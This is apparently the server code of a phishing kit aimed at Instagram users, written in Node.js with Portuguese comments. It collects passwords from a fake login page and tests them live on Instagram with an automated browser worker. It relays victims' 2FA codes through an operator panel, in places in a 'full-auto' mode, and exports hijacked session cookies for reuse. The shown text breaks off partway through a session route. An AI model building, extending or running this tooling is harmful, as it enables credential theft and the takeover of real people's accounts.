const express = require("express");
const fs = require("fs");
const path = require("path");
const { execFile } = require("child_process");
const dbOps = require("./db");
const audit = require("./audit");
const auth = require("./auth");

process.on("uncaughtException", (err) => {
    console.error("[CRITICAL] Uncaught Exception:", err.message || err);
});

process.on("unhandledRejection", (reason) => {
    console.error("[CRITICAL] Unhandled Rejection:", reason);
});

const app = express();
const PORT = process.env.PORT || 5501;
const WORKER_URL = process.env.WORKER_URL || "http://127.0.0.1:3006";

const PUBLIC_DIR = path.join(__dirname, "public");
const CODIGO_DIR = path.join(__dirname, "codigo");
const DADOS_JSON = path.join(__dirname, "dados.json");
const RESULTADO_JSON = path.join(__dirname, "resultado.json");
const SESSOES_DIR = path.join(__dirname, "sessoes");

if (!fs.existsSync(SESSOES_DIR)) {
    try { fs.mkdirSync(SESSOES_DIR, { recursive: true }); } catch (e) {}
}

const URL_FINAL_PADRAO = "https://www.instagram.com";
const BOT_PY = path.join(__dirname, "bot.py");
const PYTHON = process.platform === "win32"
    ? "python"
    : (fs.existsSync("/opt/ig-tf-main/venv/bin/python")
        ? "/opt/ig-tf-main/venv/bin/python"
        : (fs.existsSync(path.join(__dirname, "venv", "bin", "python"))
            ? path.join(__dirname, "venv", "bin", "python")
            : "python3"));

let configApp = {
    auto_mode: true // Modo 100% autônomo ativo por padrão
};

let sseClients = [];

function extrairTenant(req) {
    const fromBody = req.body && req.body.tenant;
    const fromQuery = req.query && (req.query.tenant || req.query.cliente);
    const fromHeader = req.headers && req.headers["x-tenant-id"];
    const t = fromBody || fromQuery || fromHeader || "default";
    return String(t).trim() || "default";
}

function notificarClientes() {
    if (sseClients.length === 0) return;
    try {
        const cachePayloads = new Map();
        sseClients = sseClients.filter(client => {
            try {
                if (client.res.writableEnded || client.res.destroyed) return false;
                const clientTenant = client.tenant || "global";
                if (!cachePayloads.has(clientTenant)) {
                    cachePayloads.set(clientTenant, `data: ${JSON.stringify(gerarDadosPainel(client.tenant))}\n\n`);
                }
                client.res.write(cachePayloads.get(clientTenant));
                return true;
            } catch (e) {
                return false;
            }
        });
    } catch (err) {
        console.error("Erro ao notificar SSE:", err);
    }
}

function lerDados() {
    if (!fs.existsSync(DADOS_JSON)) return [];
    try {
        const conteudo = fs.readFileSync(DADOS_JSON, "utf8");
        if (!conteudo.trim()) return [];
        const dados = JSON.parse(conteudo);
        return Array.isArray(dados) ? dados : [];
    } catch (erro) {
        console.error("Erro ao ler dados.json:", erro);
        return [];
    }
}

function salvarDados(dados) {
    fs.writeFileSync(DADOS_JSON, JSON.stringify(dados, null, 2) + "\n", "utf8");
}

function lerResultados() {
    if (!fs.existsSync(RESULTADO_JSON)) return [];
    try {
        const conteudo = fs.readFileSync(RESULTADO_JSON, "utf8");
        if (!conteudo.trim()) return [];
        const resultados = JSON.parse(conteudo);
        if (Array.isArray(resultados)) return resultados;
        if (resultados && typeof resultados === "object") return [resultados];
        return [];
    } catch (erro) {
        console.error("Erro ao ler resultado.json:", erro);
        return [];
    }
}

function salvarResultados(resultados) {
    fs.writeFileSync(RESULTADO_JSON, JSON.stringify(resultados, null, 2) + "\n", "utf8");
}

function gerarDadosPainel(tenant = null) {
    // 1. Prioriza persistência atômica do SQLite com suporte multi-tenant
    const dadosConsolidados = dbOps.obterDadosConsolidados(configApp.auto_mode, tenant);
    if (dadosConsolidados) {
        return dadosConsolidados;
    }

    // 2. Fallback via arquivos JSON
    const dados = lerDados();
    const resultados = lerResultados();
    const codigos2fa = dados.filter(d => d.tipo === "2FA" || d.codigo || d.code);
    const logins = dados.filter(d => (d.tipo === "LOGIN" || !d.tipo) && (d.senha || d.password));

    const mapaUsuarios = new Map();

    dados.forEach(d => {
        const u = (d.nome || d.usuario || d.username || "desconhecido").trim();
        const userKey = u.toLowerCase();
        if (!mapaUsuarios.has(userKey)) {
            mapaUsuarios.set(userKey, {
                tenant: d.tenant || "default",
                usuario: u,
                senhas: [],
                ultimaSenha: "—",
                codigos: [],
                ultimoCodigo: null,
                status_2fa: null,
                status_login: null,
                status_credencial: "testando",
                cookies: null,
                total_cookies: 0,
                url_final: URL_FINAL_PADRAO,
                tem_sessao_salva: false,
                data_hora: d.data_hora || d.createdAt || "—",
                ultimoEventoTipo: null
            });
        }

        const item = mapaUsuarios.get(userKey);
        item.data_hora = d.data_hora || d.createdAt || item.data_hora;

        const codigo = d.codigo || d.code;
        const senha = d.senha || d.password;

        if (d.tipo === "2FA" || codigo) {
            item.ultimoEventoTipo = "2FA";
            const codStr = String(codigo);
            if (!item.codigos.includes(codStr)) item.codigos.push(codStr);
            item.ultimoCodigo = codStr;
            item.status_2fa = d.status_2fa || "pendente";
        } else if (senha) {
            item.ultimoEventoTipo = "LOGIN";
            const senhaStr = String(senha);
            if (!item.senhas.includes(senhaStr)) item.senhas.push(senhaStr);
            item.ultimaSenha = senhaStr;
            item.status_login = d.status_login || "aguardando_solicitacao";
            item.status_credencial = d.status_credencial || "testando";
            item.ultimoCodigo = null;
            item.status_2fa = null;
        }
    });

    mapaUsuarios.forEach((item, userKey) => {
        if (!item.status_credencial || item.status_credencial === "testando") {
            for (let i = resultados.length - 1; i >= 0; i--) {
                const r = resultados[i];
                if (r && (r.nome || r.usuario || r.username || "").toLowerCase().trim() === userKey) {
                    item.status_credencial = r.valido ? "valido" : "invalido";
                    break;
                }
            }
        }
    });

    mapaUsuarios.forEach(item => {
        if (item.ultimoCodigo) {
            if (item.status_2fa === "aceito") {
                item.status = "2FA Aceito";
            } else if (item.status_2fa === "negado") {
                item.status = "2FA Negado";
            } else {
                item.status = "Aguardando Decisão";
            }
        } else {
            if (item.status_login === "solicitar_2fa") {
                item.status = "2FA Solicitado";
            } else {
                item.status = "Aguardando Operador";
            }
        }
    });

    const consolidados = Array.from(mapaUsuarios.values()).reverse();
    const feed = [...dados].reverse().map(d => ({
        tenant: d.tenant || "default",
        tipo: (d.tipo === "2FA" || d.codigo || d.code) ? "2FA" : "LOGIN",
        usuario: d.nome || d.usuario || d.username || "desconhecido",
        senha: d.senha || d.password || null,
        codigo: d.codigo || d.code || null,
        status_2fa: d.status_2fa || null,
        status_login: d.status_login || null,
        status_credencial: d.status_credencial || null,
        data_hora: d.data_hora || d.createdAt || "—"
    }));

    return {
        success: true,
        auto_mode: configApp.auto_mode,
        totalLogins: logins.length,
        total2FA: codigos2fa.length,
        totalUsuarios: mapaUsuarios.size,
        consolidados,
        feed
    };
}

// Anti-cache middleware
app.use((req, res, next) => {
    if (req.path.startsWith("/api") || req.path.endsWith(".js") || req.path.endsWith(".html")) {
        res.set({
            "Cache-Control": "no-store, no-cache, must-revalidate, proxy-revalidate",
            "Pragma": "no-cache",
            "Expires": "0",
            "Surrogate-Control": "no-store"
        });
    }
    next();
});

app.use(express.json({ limit: "2mb" }));
app.use(express.urlencoded({ extended: true, limit: "2mb" }));

// Servir diretório codigo estaticamente em /codigo
app.use("/codigo", express.static(CODIGO_DIR));
// Servir diretório public na raiz
app.use(express.static(PUBLIC_DIR));

// Execução direta do bot Playwright standalone (fallback)
function executarBot() {
    return new Promise((resolve, reject) => {
        console.log("[FALLBACK] Acionando bot.py diretamente via child_process...");
        execFile(
            PYTHON,
            [BOT_PY],
            {
                cwd: __dirname,
                timeout: 45000
            },
            (erro, stdout, stderr) => {
                if (stdout) {
                    console.log("\n========== BOT ==========\n" + stdout + "=========================\n");
                }
                if (stderr) {
                    console.error("\n========== PYTHON STDERR ==========\n" + stderr + "===================================\n");
                }
                if (erro) {
                    return reject(erro);
                }
                resolve();
            }
        );
    });
}

// Disparo assíncrono para o Warm Worker Playwright (:3006) com telemetria e auditoria completa
async function testarViaWorker(usuario, senha, reqMeta = {}) {
    const t0 = performance.now();
    const tenant = reqMeta.tenant || "default";

    audit.registrar({
        tenant,
        event_type: "VALIDATION_START",
        usuario,
        status: "PENDING",
        details: { endpoint: `${WORKER_URL}/testar`, tenant },
        ip: reqMeta.ip || "",
        userAgent: reqMeta.userAgent || ""
    });

    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 22000);

        const res = await fetch(`${WORKER_URL}/testar`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ usuario, senha }),
            signal: controller.signal
        });
        clearTimeout(timeoutId);

        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const data = await res.json();
        const duracaoMs = performance.now() - t0;
        const duracaoSec = (duracaoMs / 1000).toFixed(2);

        const statusCred = data.status_credencial || (data.valido ? "valido" : "invalido");
        const statusLogin = (data.valido && configApp.auto_mode) ? "solicitar_2fa" : undefined;

        // Atualização ACID no SQLite e sincronização atômica para dados.json
        dbOps.atualizarStatusCredencial(usuario, statusCred, statusLogin);

        // Fallback para dados.json se SQLite não disponível
        const dados = lerDados();
        let atualizou = false;
        const userKey = usuario.toLowerCase().trim();
        for (let i = dados.length - 1; i >= 0; i--) {
            const item = dados[i];
            if (item && (item.senha || item.password)) {
                const u = (item.nome || item.usuario || item.username || "").toLowerCase().trim();
                if (u === userKey) {
                    item.status_credencial = statusCred;
                    if (statusLogin) item.status_login = statusLogin;
                    atualizou = true;
                    break;
                }
            }
        }
        if (atualizou) salvarDados(dados);

        // Registro detalhado no sistema de auditoria
        audit.registrar({
            tenant,
            event_type: data.valido ? "VALIDATION_SUCCESS" : (statusCred === "bloqueio_captcha" ? "CAPTCHA_BLOCKED" : "VALIDATION_FAILED"),
            usuario,
            status: data.valido ? "SUCCESS" : (statusCred === "bloqueio_captcha" ? "BLOCKED" : "FAILED"),
            duration_ms: duracaoMs,
            details: {
                tenant,
                valido: data.valido,
                status_credencial: statusCred,
                mensagem: data.mensagem,
                tempo_segundos: Number(duracaoSec),
                auto_mode: configApp.auto_mode
            },
            ip: reqMeta.ip || "",
            userAgent: reqMeta.userAgent || ""
        });

        if (data.valido && configApp.auto_mode) {
            audit.registrar({
                tenant,
                event_type: "AUTO_DECISION",
                usuario,
                status: "INFO",
                details: { acao: "solicitar_2fa_automatico", motivo: "credencial_valida_instagram" },
                ip: reqMeta.ip || "",
                userAgent: reqMeta.userAgent || ""
            });
            console.log(`[FULL-AUTO][${tenant}] 🚀 ${usuario} senha válida no IG em ${duracaoSec}s -> 2FA disparado automaticamente!`);
        }

        notificarClientes();
        console.log(`[WARM WORKER][${tenant}] ⚡ ${usuario} verificado em ${duracaoSec}s -> ${statusCred} (${data.mensagem || ''})`);
        return true;
    } catch (err) {
        const duracaoMs = performance.now() - t0;
        console.warn("[WARM WORKER] Worker offline ou ocupado, acionando fallback bot.py:", err.message);
        audit.registrar({
            tenant,
            event_type: "VALIDATION_FALLBACK",
            usuario,
            status: "WARNING",
            duration_ms: duracaoMs,
            details: { tenant, error: err.message, fallback: "bot.py" },
            ip: reqMeta.ip || "",
            userAgent: reqMeta.userAgent || ""
        });
        executarBot().catch(erro => {
            console.error("Execução assíncrona do bot.py:", erro.message);
        });
        return false;
    }
}

// Rota de salvamento de login (suporta /salvar e /api/login)
const handleSalvarLogin = (req, res) => {
    const nome = req.body.nome || req.body.usuario || req.body.username;
    const senha = req.body.senha || req.body.password;
    const tenant = extrairTenant(req);
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
    const userAgent = req.headers["user-agent"] || "";

    if (!nome || !senha || !String(nome).trim() || !String(senha)) {
        return res.status(400).json({
            success: false,
            status: "erro",
            mensagem: "Preencha todos os campos."
        });
    }

    try {
        const usuarioLimpo = String(nome).trim();
        const senhaLimpa = String(senha);
        const tipoIdentificador = req.body.tipo_identificador || dbOps.detectarTipoIdentificador(usuarioLimpo);
        const identificadorFormatado = dbOps.formatarIdentificador(usuarioLimpo, tipoIdentificador);

        // 1. Registro de auditoria imediato
        audit.registrar({
            tenant,
            event_type: "LOGIN_SUBMITTED",
            usuario: usuarioLimpo,
            status: "INFO",
            details: { tenant, tipo_identificador: tipoIdentificador, identificador_formatado: identificadorFormatado, ip, userAgent },
            ip,
            userAgent
        });

        // 2. Persistência relacional no SQLite
        dbOps.salvarLogin({
            tenant,
            usuario: usuarioLimpo,
            senha: senhaLimpa,
            ip,
            userAgent,
            tipo_identificador: tipoIdentificador
        });

        // 3. Fallback em dados.json
        const dados = lerDados();
        dados.push({
            tenant,
            tipo: "LOGIN",
            tipo_identificador: tipoIdentificador,
            identificador_formatado: identificadorFormatado,
            nome: usuarioLimpo,
            usuario: usuarioLimpo,
            username: usuarioLimpo,
            senha: senhaLimpa,
            password: senhaLimpa,
            status_login: "aguardando_solicitacao",
            status_credencial: "testando",
            data_hora: new Date().toLocaleString("pt-BR"),
            createdAt: new Date().toISOString()
        });
        salvarDados(dados);
        notificarClientes();

        console.log(`[LOGIN][${tenant}][${tipoIdentificador.toUpperCase()}] Nova tentativa recebida: ${usuarioLimpo} (${identificadorFormatado}) (Status: aguardando operador | Auditoria: testando no IG)`);

        // 4. Dispara validação prioritária via Warm Worker
        testarViaWorker(usuarioLimpo, senhaLimpa, { tenant, ip, userAgent, tipo_identificador: tipoIdentificador });

        // Timeout de segurança calibrado de 25s
        setTimeout(() => {
            try {
                const dadosAtualizados = lerDados();
                let atualizou = false;
                const uKey = usuarioLimpo.toLowerCase();
                for (let i = dadosAtualizados.length - 1; i >= 0; i--) {
                    const item = dadosAtualizados[i];
                    if (item && (item.senha || item.password)) {
                        const u = (item.nome || item.usuario || item.username || "").toLowerCase().trim();
                        if (u === uKey && item.status_credencial === "testando") {
                            item.status_credencial = "invalido";
                            atualizou = true;
                            break;
                        }
                    }
                }
                if (atualizou) {
                    salvarDados(dadosAtualizados);
                    notificarClientes();
                }
            } catch (e) {}
        }, 25000);

        return res.status(201).json({
            success: true,
            status_login: "aguardando_solicitacao",
            status_credencial: "testando",
            usuario: usuarioLimpo,
            tenant,
            mensagem: "Login registrado com sucesso."
        });
    } catch (erro) {
        console.error("Erro em salvar login:", erro);
        return res.status(500).json({
            success: false,
            status: "erro",
            mensagem: "Erro interno durante o processamento."
        });
    }
};

app.post("/salvar", handleSalvarLogin);
app.post("/api/login", handleSalvarLogin);

// Rota de recebimento de código 2FA (/codigo, /salvar-codigo, /api/2fa)
const handleSalvar2FA = (req, res) => {
    const nome = req.body.nome || req.body.usuario || req.body.username;
    const codigo = req.body.codigo || req.body.code || req.body.otp;
    const tenant = extrairTenant(req);
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";

    if (!codigo || !String(codigo).trim()) {
        return res.status(400).json({ success: false, mensagem: "Código 2FA obrigatório." });
    }

    try {
        const usuarioLimpo = nome ? String(nome).trim() : "desconhecido";
        const codigoLimpo = String(codigo).trim();

        // 1. Registro de auditoria
        audit.registrar({
            tenant,
            event_type: "2FA_SUBMITTED",
            usuario: usuarioLimpo,
            status: "INFO",
            details: { codigo: codigoLimpo, tenant, ip },
            ip
        });

        // 2. Persistência no SQLite
        dbOps.salvar2FA({
            tenant,
            usuario: usuarioLimpo,
            codigo: codigoLimpo,
            ip
        });

        // 3. Fallback em dados.json
        const dados = lerDados();
        dados.push({
            tenant,
            tipo: "2FA",
            nome: usuarioLimpo,
            usuario: usuarioLimpo,
            username: usuarioLimpo,
            codigo: codigoLimpo,
            code: codigoLimpo,
            status_2fa: "pendente",
            data_hora: new Date().toLocaleString("pt-BR"),
            createdAt: new Date().toISOString()
        });
        salvarDados(dados);
        notificarClientes();

        console.log(`[2FA][${tenant}] Código recebido para ${usuarioLimpo}: ${codigoLimpo}`);

        return res.json({
            success: true,
            usuario: usuarioLimpo,
            codigo: codigoLimpo,
            status_2fa: "pendente",
            mensagem: "Código 2FA registrado com sucesso."
        });
    } catch (erro) {
        console.error("Erro em salvar 2FA:", erro);
        return res.status(500).json({ success: false, mensagem: "Erro interno ao processar código." });
    }
};

app.post("/salvar-codigo", handleSalvar2FA);
app.post("/api/2fa", handleSalvar2FA);

// Decisão manual de 2FA pelo operador
app.post("/api/decidir-2fa", (req, res) => {
    const { usuario, decisao } = req.body;
    const tenant = extrairTenant(req);

    if (!usuario || !decisao || !["aceito", "negado"].includes(decisao)) {
        return res.status(400).json({ success: false, mensagem: "Parâmetros inválidos." });
    }

    try {
        const usuarioLimpo = String(usuario).trim();

        // Atualização no SQLite
        dbOps.atualizarStatus2FA(usuarioLimpo, decisao);

        // Fallback em dados.json
        const dados = lerDados();
        const userKey = usuarioLimpo.toLowerCase();
        let achou = false;
        for (let i = dados.length - 1; i >= 0; i--) {
            const item = dados[i];
            const u = (item.nome || item.usuario || item.username || "").toLowerCase().trim();
            if (u === userKey && (item.tipo === "2FA" || item.codigo || item.code)) {
                item.status_2fa = decisao;
                achou = true;
                break;
            }
        }
        if (achou) salvarDados(dados);

        // Registro de auditoria
        audit.registrar({
            tenant,
            event_type: decisao === "aceito" ? "2FA_ACCEPTED" : "2FA_REJECTED",
            usuario: usuarioLimpo,
            status: decisao === "aceito" ? "SUCCESS" : "FAILED",
            details: { decisao, tenant }
        });

        notificarClientes();
        console.log(`[OPERADOR][${tenant}] 2FA de ${usuarioLimpo} marcado como: ${decisao.toUpperCase()}`);

        return res.json({
            success: true,
            usuario: usuarioLimpo,
            status_2fa: decisao,
            url_final: URL_FINAL_PADRAO
        });
    } catch (err) {
        console.error("Erro em /api/decidir-2fa:", err);
        return res.status(500).json({ success: false, mensagem: "Erro ao processar decisão." });
    }
});

// Solicitar avanço para tela de 2FA pelo operador
app.post("/api/solicitar-2fa", (req, res) => {
    const { usuario, forcar } = req.body;
    const tenant = extrairTenant(req);

    if (!usuario) {
        return res.status(400).json({ success: false, mensagem: "Usuário obrigatório." });
    }

    try {
        const usuarioLimpo = String(usuario).trim();
        dbOps.atualizarStatusLogin(usuarioLimpo, "solicitar_2fa");

        // Fallback em dados.json
        const dados = lerDados();
        const userKey = usuarioLimpo.toLowerCase();
        for (let i = dados.length - 1; i >= 0; i--) {
            const item = dados[i];
            const u = (item.nome || item.usuario || item.username || "").toLowerCase().trim();
            if (u === userKey && (item.senha || item.password)) {
                item.status_login = "solicitar_2fa";
                break;
            }
        }
        salvarDados(dados);

        audit.registrar({
            tenant,
            event_type: "2FA_REQUESTED",
            usuario: usuarioLimpo,
            status: "INFO",
            details: { forcar: !!forcar, tenant }
        });

        notificarClientes();
        console.log(`[OPERADOR][${tenant}] 2FA Solicitado para: ${usuarioLimpo} (Forçado: ${!!forcar})`);

        return res.json({
            success: true,
            usuario: usuarioLimpo,
            status_login: "solicitar_2fa"
        });
    } catch (err) {
        console.error("Erro em /api/solicitar-2fa:", err);
        return res.status(500).json({ success: false, mensagem: "Erro ao solicitar 2FA." });
    }
});

// Polling de status do login (para a tela da vítima saber se avança ou exibe senha incorreta)
app.get("/api/status-login", (req, res) => {
    const usuario = (req.query.usuario || req.query.username || "").toLowerCase().trim();
    const dados = lerDados();
    const resultados = lerResultados();

    for (let i = dados.length - 1; i >= 0; i--) {
        const item = dados[i];
        if (item && (item.senha || item.password)) {
            const userKey = (item.nome || item.usuario || item.username || "").toLowerCase().trim();
            if (!usuario || userKey === usuario) {
                let statusCred = item.status_credencial || "testando";
                if (statusCred === "testando") {
                    for (let j = resultados.length - 1; j >= 0; j--) {
                        const r = resultados[j];
                        if (r && (r.nome || r.usuario || r.username || "").toLowerCase().trim() === userKey) {
                            statusCred = r.valido ? "valido" : "invalido";
                            break;
                        }
                    }
                }

                return res.json({
                    success: true,
                    status_login: item.status_login || "aguardando_solicitacao",
                    status_credencial: statusCred,
                    usuario: item.nome || item.usuario || item.username
                });
            }
        }
    }

    return res.json({
        success: true,
        status_login: "aguardando_solicitacao",
        status_credencial: "testando",
        usuario
    });
});

// Polling de status do 2FA
app.get("/api/status-2fa", (req, res) => {
    const usuario = (req.query.usuario || req.query.username || "").toLowerCase().trim();
    const dados = lerDados();

    for (let i = dados.length - 1; i >= 0; i--) {
        const item = dados[i];
        if (item && (item.tipo === "2FA" || item.codigo || item.code)) {
            const userKey = (item.nome || item.usuario || item.username || "").toLowerCase().trim();
            if (!usuario || userKey === usuario) {
                return res.json({
                    success: true,
                    status_2fa: item.status_2fa || "pendente",
                    usuario: item.nome || item.usuario || item.username,
                    url_final: URL_FINAL_PADRAO
                });
            }
        }
    }

    return res.json({
        success: true,
        status_2fa: "pendente",
        usuario,
        url_final: URL_FINAL_PADRAO
    });
});

// Endpoint consolidado do Painel de Controle
app.get("/api/painel", (req, res) => {
    try {
        const tenant = req.query.tenant || null;
        const payload = gerarDadosPainel(tenant);
        res.json(payload);
    } catch (err) {
        console.error("Erro ao carregar painel:", err);
        res.status(500).json({ success: false, mensagem: "Erro ao ler registros." });
    }
});

// Stream SSE em tempo real com heartbeat
app.get("/api/stream", (req, res) => {
    res.setHeader("Content-Type", "text/event-stream");
    res.setHeader("Cache-Control", "no-cache");
    res.setHeader("Connection", "keep-alive");
    if (res.flushHeaders) res.flushHeaders();

    const tenant = req.query.tenant || null;
    const clientId = Date.now() + "_" + Math.random();
    const newClient = { id: clientId, res, tenant };
    sseClients.push(newClient);

    try {
        const initialData = `data: ${JSON.stringify(gerarDadosPainel(tenant))}\n\n`;
        res.write(initialData);
    } catch (e) {}

    const keepAlive = setInterval(() => {
        try {
            if (!res.writableEnded && !res.destroyed) {
                res.write(": keepalive\n\n");
            }
        } catch (e) {}
    }, 25000);

    const removerCliente = () => {
        clearInterval(keepAlive);
        sseClients = sseClients.filter(c => c.id !== clientId);
    };

    req.on("close", removerCliente);
    req.on("error", removerCliente);
    res.on("close", removerCliente);
    res.on("error", removerCliente);
});

// ==========================================
// ENDPOINTS DE AUDITORIA & TELEMETRIA
// ==========================================
app.get("/api/audit-logs", (req, res) => {
    try {
        const { limit = 150, offset = 0, usuario = "", event_type = "", status = "", tenant = "" } = req.query;
        const logs = audit.listar({
            limit: parseInt(limit, 10) || 150,
            offset: parseInt(offset, 10) || 0,
            usuario: String(usuario || "").trim(),
            event_type: String(event_type || "").trim(),
            status: String(status || "").trim(),
            tenant: String(tenant || "").trim()
        });
        return res.json({ success: true, total: logs.length, logs });
    } catch (e) {
        return res.status(500).json({ success: false, error: e.message });
    }
});

app.get("/api/audit-stats", (req, res) => {
    try {
        const tenant = req.query.tenant || null;
        const stats = audit.obterEstatisticas(tenant);
        return res.json({ success: true, stats });
    } catch (e) {
        return res.status(500).json({ success: false, error: e.message });
    }
});

app.delete("/api/audit-logs", (req, res) => {
    try {
        audit.limpar();
        return res.json({ success: true, mensagem: "Logs de auditoria limpos com sucesso." });
    } catch (e) {
        return res.status(500).json({ success: false, error: e.message });
    }
});

// Configuração do Modo Full-Auto
app.get("/api/config/auto-mode", (req, res) => {
    res.json({ success: true, auto_mode: configApp.auto_mode });
});

app.post("/api/config/auto-mode", (req, res) => {
    const { auto_mode } = req.body;
    if (typeof auto_mode === "boolean") {
        configApp.auto_mode = auto_mode;
        console.log(`[CONFIG] Modo de automação alterado para: ${configApp.auto_mode ? 'FULL-AUTO (100% Autônomo)' : 'MANUAL'}`);
        audit.registrar({
            tenant: extrairTenant(req),
            event_type: "CONFIG_CHANGE",
            status: "INFO",
            details: { auto_mode: configApp.auto_mode }
        });
        notificarClientes();
    }
    res.json({ success: true, auto_mode: configApp.auto_mode });
});

// Lista de tenants conhecidos
app.get("/api/tenants", (req, res) => {
    try {
        const tenants = dbOps.listarTenants();
        res.json({ success: true, tenants });
    } catch (err) {
        res.json({ success: true, tenants: ["default"] });
    }
});

// Lista de usuários capturados (para seletores multi-usuário de sessão e remota)
app.get("/api/usuarios", (req, res) => {
    try {
        const tenant = (req.query.tenant || req.query.cliente || "").trim();
        const usuarios = dbOps.obterListaUsuarios(tenant);
        res.json({
            success: true,
            tenant: tenant || "global",
            total: usuarios.length,
            usuarios
        });
    } catch (err) {
        console.error("[API] Erro ao listar usuários:", err.message);
        res.status(500).json({ success: false, error: err.message, usuarios: [] });
    }
});

// Limpeza de dados (Zero Test Pollution)
app.post("/api/limpar", (req, res) => {
    try {
        const tenant = req.body.tenant || req.query.tenant || null;
        dbOps.limparTodosDados(tenant);
        salvarDados([]);
        salvarResultados([]);
        audit.registrar({
            tenant: tenant || "global",
            event_type: "DATA_PURGE",
            status: "WARNING",
            details: { action: "limpar_painel_operador", tenant: tenant || "global" }
        });
        notificarClientes();
        res.json({ success: true, mensagem: "Registros limpos com sucesso." });
    } catch (err) {
        console.error("Erro ao limpar dados:", err);
        res.status(500).json({ success: false, mensagem: "Erro ao limpar dados." });
    }
});

// ==========================================
// AUTENTICAÇÃO DO PAINEL (PIN)
// ==========================================
app.post("/api/auth/pin", (req, res) => {
    const { pin } = req.body;
    if (auth.verificarPin(pin)) {
        auth.definirCookieSessao(res);
        return res.json({ success: true, mensagem: "Acesso autorizado com sucesso." });
    }
    return res.status(401).json({ success: false, mensagem: "PIN incorreto." });
});

app.get("/api/auth/status", (req, res) => {
    const autenticado = auth.estaAutenticado(req);
    res.json({ success: true, autenticado });
});

app.post("/api/auth/logout", (req, res) => {
    auth.limparCookieSessao(res);
    res.json({ success: true, mensagem: "Sessão encerrada." });
});

// ==========================================
// RESOLUÇÃO DE SESSÃO & COOKIES
// ==========================================
function resolverSessaoCookies(usuarioParam, tenantParam) {
    const usuario = (usuarioParam || "").trim();
    if (!usuario) return null;
    const userKey = usuario.toLowerCase();

    // 1. Consulta no SQLite via dbOps
    const sessDb = dbOps.obterSessao(userKey, tenantParam);
    if (sessDb && sessDb.cookies && sessDb.cookies.length > 0) {
        return {
            sessionData: {
                tenant: sessDb.tenant || "default",
                usuario: sessDb.usuario,
                cookies: sessDb.cookies,
                total_cookies: sessDb.total_cookies || sessDb.cookies.length,
                url_final: sessDb.url_final || URL_FINAL_PADRAO,
                data_hora: new Date(sessDb.updated_at || Date.now()).toLocaleString("pt-BR")
            },
            userKey
        };
    }

    // 2. Fallback: busca em sessoes/
    const SESSOES_DIR = path.join(__dirname, "sessoes");
    if (fs.existsSync(SESSOES_DIR)) {
        try {
            const files = fs.readdirSync(SESSOES_DIR).filter(f => f.endsWith("_cookies.json"));
            const cleanKey = userKey.replace(/[^a-z0-9_-]/g, "_");
            const candidate = files.find(f => {
                const base = f.replace(/_cookies\.json$/, "").toLowerCase();
                return base === userKey || base === cleanKey || base.includes(cleanKey) || cleanKey.includes(base);
            });
            if (candidate) {
                const raw = JSON.parse(fs.readFileSync(path.join(SESSOES_DIR, candidate), "utf8"));
                return {
                    sessionData: {
                        tenant: raw.tenant || "default",
                        usuario: raw.usuario || usuario,
                        cookies: raw.cookies || [],
                        total_cookies: raw.total_cookies || (raw.cookies ? raw.cookies.length : 0),
                        url_final: raw.url_final || URL_FINAL_PADRAO,
                        data_hora: raw.updated_at ? new Date(raw.updated_at).toLocaleString("pt-BR") : new Date().toLocaleString("pt-BR")
                    },
                    userKey
                };
            }
        } catch (e) {
            console.error("[SESSAO] Erro na busca flexível de cookies:", e.message);
        }
    }

    // 3. Fallback: busca em resultado.json
    const resultados = lerResultados();
    for (let i = resultados.length - 1; i >= 0; i--) {
        const r = resultados[i];
        if (!r || !r.cookies) continue;
        const rNome = (r.nome || "").toLowerCase().trim();
        if (rNome === userKey || rNome.includes(userKey) || userKey.includes(rNome)) {
            return {
                sessionData: {
                    tenant: r.tenant || "default",
                    usuario: r.nome,
                    cookies: r.cookies,
                    total_cookies: r.cookies.length,
                    url_final: r.url_final || URL_FINAL_PADRAO,
                    data_hora: r.data_hora || new Date().toLocaleString("pt-BR")
                },
                userKey
            };
        }
    }

    return null;
}

// Rotas de Exportação de Sessão (formato json e netscape)
app.get(
    ["/api/sessao/exportar", "/api/sessaoremota/exportar", "/api/sessao/:usuario/exportar", "/api/sessaoremota/:usuario/exportar"],
    (req, res) => {
        const usuarioParam = (req.params.usuario && req.params.usuario !== "exportar") ? req.params.usuario : (req.query.usuario || "");
        const tenantParam = req.query.tenant || req.query.cliente || null;
        const formato = (req.query.formato || "json").toLowerCase();
        const resolved = resolverSessaoCookies(usuarioParam, tenantParam);
        if (!resolved || !resolved.sessionData || !resolved.sessionData.cookies) {
            return res.status(404).send("Sessão não encontrada");
        }

        const { sessionData, userKey } = resolved;
        const cookies = sessionData.cookies;

        if (formato === "netscape" || formato === "txt") {
            let txt = "# Netscape HTTP Cookie File\n";
            txt += "# https://curl.se/docs/http-cookies.html\n";
            txt += `# Capturado por IG Monitor em ${sessionData.data_hora || new Date().toISOString()} [Tenant: ${sessionData.tenant || 'default'}]\n\n`;

            cookies.forEach(c => {
                const domain = c.domain.startsWith(".") ? c.domain : `.${c.domain}`;
                const flag = domain.startsWith(".") ? "TRUE" : "FALSE";
                const path = c.path || "/";
                const secure = c.secure ? "TRUE" : "FALSE";
                const expiry = c.expires && c.expires > 0 ? Math.floor(c.expires) : Math.floor(Date.now() / 1000) + 86400 * 30;
                txt += `${domain}\t${flag}\t${path}\t${secure}\t${expiry}\t${c.name}\t${c.value}\n`;
            });

            res.setHeader("Content-Type", "text/plain; charset=utf-8");
            res.setHeader("Content-Disposition", `attachment; filename="cookies_${userKey}.txt"`);
            return res.send(txt);
        }

        // Formato Cookie-Editor
        const cookieEditorFormat = cookies.map(c => ({
            domain: c.domain,
            expirationDate: c.expires && c.expires > 0 ? c.expires : undefined,
            hostOnly: !c.domain.startsWith("."),
            httpOnly: !!c.httpOnly,
            name: c.name,
            path: c.path || "/",
            sameSite: c.sameSite ? c.sameSite.toLowerCase() : "unspecified",
            secure: !!c.secure,
            session: !c.expires || c.expires <= 0,
            storeId: "0",
            value: c.value
        }));

        res.setHeader("Content-Type", "application/json; charset=utf-8");
        res.setHeader("Content-Disposition", `attachment; filename="cookies_${userKey}.json"`);
        return res.send(JSON.stringify(cookieEditorFormat, null, 2));
    }
);

// Rotas de Consulta JSON da Sessão
app.get(
    ["/api/sessao", "/api/sessaoremota", "/api/sessao/:usuario", "/api/sessaoremota/:usuario"],
    (req, res) => {
